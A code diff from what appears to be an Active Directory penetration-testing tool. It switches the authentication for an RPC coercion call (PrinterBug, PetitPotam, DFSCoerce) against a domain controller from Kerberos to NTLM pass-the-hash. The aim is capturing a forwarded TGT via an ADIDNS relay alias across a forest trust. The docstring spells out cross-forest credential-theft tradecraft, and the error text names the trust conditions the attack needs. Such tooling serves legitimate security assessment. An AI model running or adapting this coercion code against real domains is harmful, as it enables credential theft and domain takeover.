@@ -119,33 +119,42 @@ def _build_coercion_factory(req: KrbCaptureRequest):
     """Build the aiosmb ``SMBConnectionFactory`` that drives the RPC coercion call.
 
     The coercion RPC (PrinterBug/PetitPotam/DFSCoerce) authenticates to the target
-    DC (``coerce_target_ip``) with the credential we hold in the compromised
-    forest — the SAME domain-admin credential that writes the ADIDNS alias
-    (``req.adidns``). Kerberos is forced (``authproto="kerberos"``) because the
-    whole point of the primitive is a Kerberos-authenticated coercion whose
-    forwarded TGT the caller can decrypt; the SPN host is normalized to an FQDN so
-    the ticket binds correctly (see ``_kerberos_spn`` — an IP/short host would fall
-    back to NTLM or be rejected).
+    (``coerce_target_ip``) with the credential we hold in the compromised forest —
+    the SAME credential that writes the ADIDNS alias (``req.adidns``).
+
+    **This OUTBOUND trigger auth is NTLM/PtH, NOT Kerberos.** The Kerberos leg of
+    this primitive is the INBOUND one — the coerced target authenticates BACK to
+    the relay alias over Kerberos (driven by the SPN-canonicalization trick + TGT
+    delegation on the trust), and THAT inbound AP-REQ is what carries the
+    forwarded TGT the caller decrypts. How WE authenticate outbound to merely
+    *trigger* the RPC is irrelevant to the inbound leg — it is a separate
+    connection the target initiates on its own. Forcing Kerberos here is wrong on
+    two counts:
+
+    * The target is reached by IP (``coerce_target_ip`` — a DC of the trusting
+      forest, resolved to its reachable NIC). An IP has no SPN, so
+      ``from_components`` builds ``cifs/None@<realm>`` and the ticket mint fails
+      (``No CCACHE present``) — the exact bug that made every coercion attempt
+      abort before the RPC even fired, while ``nxc coerce_plus -H <hash>`` (NTLM
+      PtH) triggered it fine.
+    * The credential is cross-forest (a compromised-TRUSTED-forest admin reaching
+      a TRUSTING-forest DC), so a Kerberos bind would need a cross-realm referral
+      chain the trigger does not need at all — NTLM/PtH authenticates directly.
+
+    So: NTLM with the hash/password we hold (``secrettype`` auto-classified), the
+    IP as the connect target, no forced Kerberos, no ``cifs/None`` SPN.
     """
     from aiosmb.commons.connection.factory import SMBConnectionFactory
 
-    from adscan_internal.services._kerberos_spn import (
-        normalize_kerberos_target_hostname,
-    )
-
     adidns = req.adidns
-    spn_target = (
-        normalize_kerberos_target_hostname(req.coerce_target_ip, adidns.domain)
-        or req.coerce_target_ip
-    )
     return SMBConnectionFactory.from_components(
-        spn_target,
+        req.coerce_target_ip,
         adidns.username,
         adidns.password,
         secrettype=_coercion_secret_type(adidns.password),
         domain=adidns.domain,
         dcip=adidns.dc_ip or req.coerce_target_ip,
-        authproto="kerberos",
+        authproto="ntlm",
     )
 
 
@@ -212,7 +221,15 @@ async def coerce_and_capture(req: KrbCaptureRequest) -> KrbCaptureResult:
             spnego_blob=None,
             is_kerberos=False,
             relay_alias=alias_fqdn,
-            error="no authentication captured (coercion did not reach the listener)",
+            # Honest data gap (Exposure-Validation): never a defense claim. Name the
+            # two most likely causes so the operator can diagnose — cross-forest name
+            # resolution of the relay alias, or TGT delegation not enabled on the trust.
+            error=(
+                "no authentication captured (coercion did not reach the listener) — "
+                f"the coerced DC may be unable to resolve the relay alias {alias_fqdn} "
+                "(no cross-forest conditional forwarder to the trusted zone), or TGT "
+                "delegation is not enabled on the trust"
+            ),
         )
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
